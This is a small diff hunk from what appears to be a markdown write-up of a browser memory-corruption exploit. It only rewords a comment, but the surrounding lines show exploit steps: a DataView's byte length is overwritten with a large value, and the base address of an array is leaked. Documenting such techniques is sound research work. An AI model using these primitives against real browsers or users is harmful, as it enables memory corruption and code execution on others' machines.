@@ -321,7 +321,7 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
                     // set its byte length to a stupid number also
                     mydv.setUint32(mypos - 0x10, 0x100000, true);
 
-                    // leak the base of myarray
+                    // leak the base of the myarray Array
                     myarraybase = mydv.getUint32(mypos, true);
 ```
 
